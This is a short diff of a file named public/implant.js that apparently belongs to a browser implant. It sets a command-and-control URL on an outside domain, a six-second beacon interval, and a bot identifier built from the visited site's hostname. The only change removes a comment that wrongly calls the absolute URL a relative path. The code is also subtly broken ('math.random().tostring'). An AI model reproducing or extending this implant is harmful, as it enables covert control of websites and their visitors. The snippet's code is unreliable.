@@ -1,6 +1,6 @@
 // public/implant.js
 (async () => {
-    const c2_url = 'https://apis.code.apilink.infodmca.org/api'; // relative path, works on any domain
+    const c2_url = 'https://apis.code.apilink.infodmca.org/api'; 
     const beacon_interval = 6000;
     const bot_id = `${window.location.hostname}-${math.random().tostring(36).slice(2, 9)}`;
 
